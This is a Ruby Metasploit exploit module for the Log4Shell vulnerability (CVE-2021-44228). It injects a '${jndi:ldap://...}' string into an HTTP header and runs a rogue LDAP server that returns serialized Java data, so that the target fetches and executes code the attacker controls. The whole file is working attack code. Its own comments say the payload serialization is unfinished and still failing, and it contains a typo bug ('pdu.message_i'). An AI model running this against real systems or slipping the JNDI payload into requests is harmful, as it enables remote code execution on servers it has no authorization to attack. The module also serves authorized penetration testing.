##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::LDAP::Server

  def initialize
    super(
      'Name' => 'Log4Shell HTTP Header Injection',
      'Description' => %q{
        Send vulnerable header with JNDI injected URL from which the JVM will acquire
        and execute attacker controlled data.
      },
      'Author' => [
        'RageLtMan <rageltman[at]sempervictus>'
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'SRVPORT' => 389
      },
      'Platform' => 'java',
      'Arch' => [ARCH_JAVA],
      'Targets' => [
        ['Automatic', {}]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptString.new('HTTP_HEADER', [ true, 'The header to inject', 'X-Api-Version']),
      OptBool.new('LDAP_AUTH_BYPASS', [true, 'Ignore LDAP client authentication', true]),
    ])
  end

  def jndi_string
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}"
  end

  #
  # Generate and serialize the payload as an LDAP search respnse
  #
  # @param msg_id [Integer] LDAP message identifier
  # @param base_dn [Sting] LDAP distinguished name
  #
  # @return [Array] packed BER sequence
  def serialized_payload(msg_id, base_dn)
    jar    = generate_payload.encoded_jar
    jclass = Rex::Text.to_octal(jar.entries[2].data) # extract class file - this is gross, need better accessor/raw generator for this
    # Build the class into a Java byteArray - or try to, anyway
    description = Rex::Java::Serialization::Model::Reference.new
    description.handle = Rex::Java::Serialization::BASE_WIRE_HANDLE
    byte_array = Rex::Java::Serialization::Model::NewArray.new
    byte_array.array_description = Rex::Java::Serialization::Model::ClassDesc.new
    byte_array.array_description.description = description
    byte_array.type = "byte"
    byte_array.values = jclass.bytes
    # Without the to_ber/to_ber_set below, server fails with:
    # javax.naming.CommunicationException: Encountered ASN.1 tag 0 (expected tag 4) [Root exception is com.sun.jndi.ldap.Ber$DecodeException: Encountered ASN.1 tag 0 (expected tag 4)]
    serialized_ber_set = byte_array.encode.bytes.map(&:to_ber).to_ber_set
    ## Temporary test harness using:
    # public static class TEST implements Serializable {
    #   static {
    #     System.out.println("TEST CINIT!");
    #   }

    #   public TEST() {
    #     System.out.println("TEST CTOR!");
    #   }

    #   @Override public String toString() {
    #     System.out.println("TEST TOSTRING!");
    #     return "TEST!";
    #   }
    # }
    #
    ## Which is written out to a serialized file via:
    # final var send = new TEST();
    # final var serializedStream = new ByteArrayOutputStream();
    # final var objectStream = new ObjectOutputStream(serializedStream);
    # objectStream.writeObject(send);
    # serializedStream.flush();
    # try (FileOutputStream fos = new FileOutputStream("/tmp/TEST.ser")) {
    #   fos.write(serializedStream.toByteArray());
    # }
    #
    ## Then base64 encoded into the following:
    test_class = "rO0ABXNyAApCdWlsZCRURVNUFex4H4pZOcgCAAB4cA=="
    byte_array = Rex::Text.decode_base64(test_class)
    # TODO: resolve payload java serialization as this is currently not triggering on delivery
    attrs  = [
      [ "javaClassName".to_ber, ["TEST".to_ber].to_ber_set ].to_ber_sequence,
      [ "javaCodebase".to_ber, ["".to_ber].to_ber_set ].to_ber_sequence,
      # This is still failing with:
      # Error looking up JNDI resource [ldap://msf.ip:389/dc=dbktmz,dc=ylp]. javax.naming.NamingException [Root exception is java.io.EOFException]; remaining name 'dc=dbktmz,dc=ylp'
      [ "javaSerializedData".to_ber, Rex::Text.to_octal(byte_array).chars.map(&:to_ber).to_ber_set ].to_ber_sequence
    ]
    appseq = [
      base_dn.to_ber,
      attrs.to_ber_sequence
    ].to_ber_appsequence(Net::LDAP::PDU::SearchReturnedData)
    [ msg_id.to_ber, appseq ].to_ber_sequence
  end

  #
  # Handle incoming requests via service mixin
  #
  def on_dispatch_request(client, data)
    return if data.strip.empty?

    data.extend(Net::BER::Extensions::String)
    begin
      pdu = Net::LDAP::PDU.new(data.read_ber!(Net::LDAP::AsnSyntax))
      vprint_status("LDAP request data remaining: #{data}") unless data.empty?
      resp = case pdu.app_tag
             when Net::LDAP::PDU::BindRequest # bind request
               client.authenticated = true
               service.encode_ldap_response(
                 pdu.message_id,
                 Net::LDAP::ResultCodeSuccess,
                 '',
                 '',
                 Net::LDAP::PDU::BindResult
               )
             when Net::LDAP::PDU::SearchRequest # search request
               if client.authenticated || datastore['LDAP_AUTH_BYPASS']
                 client.write(serialized_payload(pdu.message_id, pdu.search_parameters[:base_object]))
                 service.encode_ldap_response(pdu.message_id, Net::LDAP::ResultCodeSuccess, '', 'Search success', Net::LDAP::PDU::SearchResult)
               else
                 service.encode_ldap_response(pdu.message_i, 50, '', 'Not authenticated', Net::LDAP::PDU::SearchResult)
               end
             else
               vprint_status("Client sent unexpected request #{pdu.app_tag}")
               client.close
             end
      resp.nil? ? client.close : on_send_response(client, resp)
    rescue StandardError => e
      print_error("Failed to handle LDAP request due to #{e}")
      client.close
    end
    resp
  end

  def exploit
    start_service
    send_request_raw(
      'uri' => normalize_uri(target_uri),
      'method' => datastore['HTTP_METHOD'],
      'headers' => { datastore['HTTP_HEADER'] => jndi_string }
    )
    handler
  ensure
    stop_service
  end
end
